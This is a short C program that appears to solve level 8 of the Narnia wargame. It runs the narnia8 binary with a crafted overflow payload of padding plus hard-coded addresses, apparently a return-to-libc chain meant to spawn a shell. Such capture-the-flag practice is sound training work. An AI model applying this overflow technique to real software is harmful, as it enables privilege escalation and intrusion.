#include <unistd.h>

int main(void){
	char * payload = "AAAABBBBCCCCDDDDEEEE\xc5\xdf\xff\xff\\FFF\xe0\x16\xe0\xf7P>\xdf\xf7\x08\x11\xf5\xf7"; 	
	char **environ = NULL;
	char *argv[3] = {"./narnia8", payload, 0};
	execve("./narnia8", argv, environ);
}
